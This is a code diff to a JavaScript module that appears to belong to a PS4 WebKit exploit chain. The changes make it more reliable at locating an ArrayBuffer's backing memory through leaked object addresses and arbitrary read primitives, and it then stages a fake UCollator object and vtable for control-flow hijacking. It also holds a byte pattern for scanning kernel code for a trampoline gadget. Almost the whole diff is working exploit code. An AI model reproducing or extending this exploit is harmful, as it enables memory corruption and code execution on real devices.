@@ -3,17 +3,22 @@
  * Runs post slopkit-core-1 primitive — no Math.expm1 pivot.
  */
 import { int64 } from "./int64.js";
+import { resolveBufAddrOff } from "./native_call.js";
 
 const COLLATOR_UCOLLATOR_OFF = 0x18;
 const COLLATOR_BOUND_COMPARE_OFF = 0x10;
 const ARENA_BYTES = 0x1000;
 const FAKE_UCOLLATOR_OFFSET = 0x100;
 const FAKE_VTABLE_OFFSET = 0x300;
+const ARENA_MARKER_OFF = 0xf00;
+const ARENA_MARKER = 0x52;
 const NOTIFICATION_REQUEST_SIZE = 0xc30;
 const NOTIFICATION_MESSAGE_OFFSET = 0x2d;
 const DEFAULT_MESSAGE = "PS4 WebKit PoC";
 const LK_TEXT_SCAN = 0x40000;
 const LK_TEXT_SCAN_STEP = 16;
+/** slopkit JSArrayBufferView.m_vector candidates (cell + off) */
+const VIEW_VECTOR_CAND = [0x10, 0x8, 0x18, 0x20, 0x28];
 const TRAMPOLINE_PATTERN = new Uint8Array([
     0x48, 0x8b, 0x8f, 0xe0, 0x00, 0x00, 0x00, 0x51,
     0x48, 0x8b, 0x4f, 0x60, 0x48, 0x8b, 0x7f, 0x48, 0xc3,
@@ -75,9 +80,93 @@ function readLow48(p, addr) {
 }
 
 function readCanonicalPtr(p, addr) {
-    const v = p.read8(addr);
-    if ((v.hi >>> 16) !== 0) return null;
+    let v;
+    try { v = p.read8(addr); } catch (_) { return null; }
+    if (!v || (v.hi >>> 16) !== 0) return null;
     return v;
+}
+
+function plausibleBackingPtr(v) {
+    if (!v || !inPs4ModuleBand(v)) return false;
+    const b = ptrBig(v);
+    return (b & 0xfn) === 0n;
+}
+
+function verifyArenaMarker(p, backing) {
+    try {
+        return p.read1(backing.add32(ARENA_MARKER_OFF)) === ARENA_MARKER;
+    } catch (_) {
+        return false;
+    }
+}
+
+function backingFromArrayBufferChain(p, leakval, ab, implOff, dataOff) {
+    let cell;
+    try { cell = leakval(ab); } catch (_) { return null; }
+    let impl;
+    try { impl = p.read8(cell.add32(implOff)); } catch (_) { return null; }
+    if (!impl || !inPs4ModuleBand(impl)) return null;
+    let data;
+    try { data = p.read8(impl.add32(dataOff)); } catch (_) { return null; }
+    if (!plausibleBackingPtr(data)) return null;
+    return data;
+}
+
+/**
+ * Resolve gigacage backing for arena Uint8Array.
+ * slopkit uses JSArrayBufferView.m_vector (+0x10); table impl chain is fallback.
+ */
+function resolveArenaBacking(p, off, arenaBuffer, arenaView, leakval, log) {
+    let viewCell;
+    try { viewCell = leakval(arenaView); } catch (e) {
+        log("NOTIFY-ARENA", "leakval(view) failed: " + (e && e.message ? e.message : e));
+        return null;
+    }
+    log("NOTIFY-ARENA", "viewCell=" + viewCell);
+
+    for (let i = 0; i < VIEW_VECTOR_CAND.length; i++) {
+        const slot = VIEW_VECTOR_CAND[i];
+        const ptr = readCanonicalPtr(p, viewCell.add32(slot));
+        if (!ptr) continue;
+        if (verifyArenaMarker(p, ptr)) {
+            log("NOTIFY-ARENA", "m_vector +0x" + slot.toString(16) + " → " + ptr);
+            return ptr;
+        }
+        if (plausibleBackingPtr(ptr))
+            log("NOTIFY-ARENA", "+0x" + slot.toString(16) + "=" + ptr + " marker miss");
+    }
+
+    const addrOff = resolveBufAddrOff(p, off);
+    if (addrOff) {
+        const data = backingFromArrayBufferChain(
+            p, leakval, arenaBuffer, addrOff.implOff, addrOff.dataOff);
+        if (data && verifyArenaMarker(p, data)) {
+            log("NOTIFY-ARENA", "ArrayBuffer chain via " + addrOff.via
+                + " impl+0x" + addrOff.implOff.toString(16)
+                + " data+0x" + addrOff.dataOff.toString(16) + " → " + data);
+            return data;
+        }
+        if (data)
+            log("NOTIFY-ARENA", "ArrayBuffer chain " + data + " marker miss");
+    }
+
+    const implOff = off.wk_ArrayBuffer_m_impl;
+    const dataOff = off.wk_ArrayBuffer_m_contents_m_data;
+    if (implOff != null && dataOff != null) {
+        const data = backingFromArrayBufferChain(p, leakval, arenaBuffer, implOff, dataOff);
+        if (data && verifyArenaMarker(p, data)) {
+            log("NOTIFY-ARENA", "table impl+0x" + implOff.toString(16) + " → " + data);
+            return data;
+        }
+    }
+
+    log("NOTIFY-ARENA-FAIL", "no backing — view dumps:");
+    for (let j = 0; j < VIEW_VECTOR_CAND.length; j++) {
+        const slot = VIEW_VECTOR_CAND[j];
+        const ptr = readCanonicalPtr(p, viewCell.add32(slot));
+        log("NOTIFY-ARENA-FAIL", "  view+0x" + slot.toString(16) + "=" + (ptr || "?"));
+    }
+    return null;
 }
 
 function buildNotificationRequest(message) {
@@ -209,14 +298,8 @@ function findTrampolineRva(p, lk, knownRva, log, opts) {
     return knownRva > 0 ? knownRva : null;
 }
 
-function arrayBufferBacking(p, off, ab, leakval) {
-    const viewCell = leakval(ab instanceof ArrayBuffer
-        ? new Uint8Array(ab) : ab);
-    const impl = readLow48(p, viewCell.add32(off.wk_ArrayBuffer_m_impl));
-    if (!impl || !inPs4ModuleBand(impl)) return null;
-    const data = readLow48(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
-    if (!data || !inPs4ModuleBand(data)) return null;
-    return data;
+function arrayBufferBacking(p, off, arenaBuffer, arenaView, leakval, log) {
+    return resolveArenaBacking(p, off, arenaBuffer, arenaView, leakval, log);
 }
 
 /**
@@ -279,25 +362,27 @@ export function stageCollatorNotify(ctx) {
     const prewarm = compareFn(notificationRequest, "b");
     if (!Number.isFinite(prewarm))
         throw new Error("notify: request prewarm failed");
-    log("NOTIFY-PREWARM", "result=" + prewarm);
+    log("NOTIFY-PREWARM", "result=" + prewarm + " (1 before fake UCollator is normal)");
 
     const arenaBuffer = new ArrayBuffer(ARENA_BYTES);
     const arenaView = new Uint8Array(arenaBuffer);
-    arenaView[0xf00] = 0x52;
-    arenaView[0xf01] = 0x4f;
-    arenaView[0xf02] = 0x50;
-    arenaView[0xf03] = 0x31;
+    arenaView[ARENA_MARKER_OFF] = 0x52;
+    arenaView[ARENA_MARKER_OFF + 1] = 0x4f;
+    arenaView[ARENA_MARKER_OFF + 2] = 0x50;
+    arenaView[ARENA_MARKER_OFF + 3] = 0x31;
     retain.push(realCollator, compareFn, arenaBuffer, arenaView, notificationRequest);
 
     const realCollatorAddr = leakval(realCollator);
     const compareFnAddr = readLow48(p, realCollatorAddr.add32(COLLATOR_BOUND_COMPARE_OFF));
-    const arenaBacking = arrayBufferBacking(p, off, arenaView, leakval);
+    log("NOTIFY-STAGE", "resolve arena backing…");
+    const arenaBacking = arrayBufferBacking(
+        p, off, arenaBuffer, arenaView, leakval, log);
     if (!arenaBacking)
-        throw new Error("notify: arena backing unresolved");
+        throw new Error("notify: arena backing unresolved — see NOTIFY-ARENA-FAIL lines");
 
-    const verifyMarker = p.read1(arenaBacking.add32(0xf00));
-    if (verifyMarker !== 0x52)
-        throw new Error("notify: arena marker read failed");
+    const verifyMarker = p.read1(arenaBacking.add32(ARENA_MARKER_OFF));
+    if (verifyMarker !== ARENA_MARKER)
+        throw new Error("notify: arena marker read failed @ " + arenaBacking);
 
     const fakeUCollatorAddr = arenaBacking.add32(FAKE_UCOLLATOR_OFFSET);
     const fakeVtableAddr = arenaBacking.add32(FAKE_VTABLE_OFFSET);
